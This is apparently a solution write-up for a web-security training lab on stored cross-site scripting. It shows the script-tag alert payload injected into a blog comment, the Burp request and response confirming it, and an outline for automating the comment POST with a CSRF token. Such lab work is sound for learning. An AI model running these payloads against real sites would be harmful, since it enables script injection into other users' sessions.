### Lab: Stored XSS into HTML context with nothing encoded

This lab contains a stored cross-site scripting vulnerability in the comment functionality.

To solve this lab, submit a comment that calls the alert function when the blog post is viewed.

_____

Analysis and Exploit:

1. Inject a simple script in the comment field under a random post
    - ```<script>alert('XSS Vuln')</script>```

2. Intercept the request in **[BURP]**
    - GET **/post?postId=5**
    - ```<p><script>alert('XSS Vuln')</script></p>``` in the response

_____

Script:

1. Check if the number of arguments is correct
    - if not, print usage instructions
2. Send XSS payload | POST **/post/comment** | params: csrf, postId, comment, name, email, website
    - csrf : get_csrf from GET **/post?postId=5**
    - postId : 5
    - comment : '%3Cscript%3Ealert%28%27XSS+Vuln%27%29%3C%2Fscript%3E'
    - name : 'test'
    - email : 'test@test.test'
    - website: 'http://test'
3. Check if ```<p><script>alert('XSS Vuln')</script></p>``` is in the response
    - if not exploit failed